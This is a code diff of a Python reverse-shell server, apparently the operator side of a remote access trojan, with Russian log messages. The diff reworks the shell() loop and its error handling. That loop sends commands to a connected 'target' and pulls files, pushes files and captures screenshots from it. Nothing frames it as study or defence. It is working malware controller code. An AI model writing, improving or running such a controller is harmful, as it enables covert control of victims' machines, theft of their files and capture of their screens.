@@ -80,40 +80,42 @@ def save_screenshot(target, screenshot_id):
 
 def shell(target, ip):
     screenshot_id = 1
-    while True:
-        try:
-            command = input(f"*Shell#~{ip}: ")
-            reliable_send(command, target)
-            if command == "q":
-                target.close()
-                logging.info("[+] Сервер и клиент закрыты.")
-            elif command == "help":
-                show_help()
-            elif command.startswith("cd"):
-                response = reliable_recv(target)
-                print(response)
-            elif command.startswith("download"):
-                download_file(command, target)
-            elif command.startswith("upload"):
-                upload_file(command, target)
-            elif command.startswith("screenshot"):
-                save_screenshot(target, screenshot_id)
-                screenshot_id += 1
-            else:
-                response = reliable_recv(target)
-                print(response)
-        except Exception as e:
-            logging.error(f"Ошибка выполнения команды: {e}")
-        finally:
-            target.close()
+    try:
+        while True:
+                command = input(f"*Shell#~{ip}: ")
+                reliable_send(command, target)
+                if command == "q":
+                    target.close()
+                    logging.info("[+] Сервер и клиент закрыты.")
+                elif command == "help":
+                    show_help()
+                elif command.startswith("cd"):
+                    response = reliable_recv(target)
+                    print(response)
+                elif command.startswith("download"):
+                    download_file(command, target)
+                elif command.startswith("upload"):
+                    upload_file(command, target)
+                elif command.startswith("screenshot"):
+                    save_screenshot(target, screenshot_id)
+                    screenshot_id += 1
+                else:
+                    try:
+                        response = reliable_recv(target)
+                        print(response)
+                    except Exception as e:
+                        logging.error(f"[!!] Ошибка получения ответа: {e}")
+                        break
+    except Exception as e:
+            logging.error(f"[!!] Ошибка обработки клиента: {e}")
+    finally:
             logging.info("[+] Клиент отключен")
 
+def signal_handler(sig, frame):
+    logging.info("\n[!] Сервер остановлен вручную")
+    sys.exit(0)
 
 def server():
-    def signal_handler(sig, frame):
-        logging.info("\n[!] Сервер остановлен вручную")
-        sys.exit(0)
-
     signal.signal(signal.SIGINT, signal_handler)
     while True:
         try:
@@ -125,6 +127,9 @@ def server():
                 target, ip = s.accept()
                 logging.info(f"[+] Подключение установлено с {ip}")
                 shell(target, ip)
+        except KeyboardInterrupt:
+            logging.info("\n[!] Сервер остановлен вручную")
+            break
         except Exception as e:
             logging.error(f"[!!] Критическая ошибка: {e}")
             continue
